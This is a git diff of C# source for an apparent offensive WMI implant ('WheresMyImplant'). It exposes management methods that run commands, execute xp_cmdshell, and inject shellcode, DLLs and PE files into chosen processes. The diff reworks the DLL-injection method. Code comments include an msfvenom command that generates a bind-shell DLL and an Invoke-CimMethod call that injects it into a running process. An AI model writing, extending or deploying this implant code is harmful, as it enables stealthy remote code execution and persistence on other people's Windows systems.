@@ -32,12 +32,14 @@ namespace WheresMyImplant
                 base.Install(stateSaver);
                 RegistrationServices registrationServices = new RegistrationServices();
             }
-            catch { }
+            catch (Exception error)
+            {
+                Console.WriteLine(error.ToString());
+            }
         }
 
         public override void Uninstall(IDictionary savedState)
         {
-
             try
             {
                 new System.EnterpriseServices.Internal.Publish().GacRemove("WhereMyImplant.dll");
@@ -50,13 +52,16 @@ namespace WheresMyImplant
             {
                 base.Uninstall(savedState);
             }
-            catch { }
+            catch (Exception error)
+            {
+                Console.WriteLine(error.ToString());
+            }
         }
     }
 
     [ManagementEntity(Name = "Win32_Implant")]
     public class Implant
-    {   
+    {
         [ManagementTask]
         public static string RunCMD(string command, string parameters)
         {
@@ -78,15 +83,6 @@ namespace WheresMyImplant
             RunXPCmdShell runXPCmdShell = new RunXPCmdShell(server, database, username, password, command);
             return runXPCmdShell.GetOutput();
         }
-        
-        /*
-        [ManagementTask]
-        public static string InjectShellCode(string shellCodeString)
-        {
-            InjectShellCode injectShellCode = new InjectShellCode(shellCodeString);
-            return injectShellCode.GetOutput();
-        }
-        */
         
         [ManagementTask]
         public static string InjectShellCode(string shellCodeString, Int32 processId)
@@ -130,22 +126,25 @@ namespace WheresMyImplant
             return injectShellCodeRemote.GetOutput();
         }
 
-        /*
         [ManagementTask]
-        public static string InjectDll(string library)
+        //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
+        //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDll -Arguments @{library = "C:\bind64.dll"; processId = 3372}
+        public static String LoadDll(String library, String strProcessId)
         {
-            InjectDll injectDll = new InjectDll(library);
-            return injectDll.GetOutput();
-        }
-        */
-
-        [ManagementTask]
-        public static string InjectDll(string library, Int32 processId)
-        {
-            //msfvenom -p windows/x64/shell_bind_tcp --format dll --arch x64 > /tmp/bind64.dll
-            //Invoke-CimMethod -ClassName Win32_Implant -Name InjectDllRemote -Arguments @{library = "C:\bind64.dll"; processId = [UInt32]3372}
-            InjectDllRemote injectDllRemote = new InjectDllRemote(library, (UInt32)processId);
-            return injectDllRemote.GetOutput();
+            Int32 dwProcessId = 0;
+            if (String.IsNullOrEmpty(strProcessId))
+            {
+                LoadDll injectDll = new LoadDll(library);
+                return injectDll.GetOutput();
+            }
+            Int32.TryParse(strProcessId, out dwProcessId);
+                String output;
+                using (LoadDllRemote injectDllRemote = new LoadDllRemote(library, (UInt32)dwProcessId))
+                {
+                    injectDllRemote.Execute();
+                    output = injectDllRemote.GetOutput();
+                }
+                return output;
         }
 
         [ManagementTask]
@@ -183,15 +182,6 @@ namespace WheresMyImplant
             }
         }
        
-       /*
-        [ManagementTask]
-        public static string InjectPeFromFile(string fileName, string parameters)
-        {
-           InjectPE injectPE = new InjectPE(new PELoader(fileName), parameters);
-           return injectPE.GetOutput();
-        }
-        */
-
         [ManagementTask]
         public static string InjectPeFile(Int32 processId, string fileName, string parameters)
         {
